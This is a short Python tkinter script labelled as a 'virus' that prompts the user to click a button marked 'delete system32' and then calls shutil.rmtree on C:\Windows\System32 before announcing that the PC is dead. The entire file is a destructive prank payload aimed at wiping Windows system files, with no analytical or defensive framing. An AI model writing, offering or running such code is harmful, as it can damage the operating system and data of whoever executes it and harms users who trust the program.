import tkinter as tk              
from tkinter import messagebox       
import shutil                         
import os                             

def launch():
    messagebox.showinfo("click me", "go ahead click the button")
    win = tk.Toplevel()
    win.title("potatos1233 virus")
    
    btn = tk.Button(win,
                    text="delete system32",
                    command=kill_system32)
    btn.pack(padx=10, pady=10)          

def kill_system32():
    target = r'C:\Windows\System32'         
    shutil.rmtree(target)                      
    messagebox.showinfo("your pc is dead", "system32 has been deleted.")
    
root = tk.Tk()      
root.withdraw()      

launch()            
root.mainloop()    
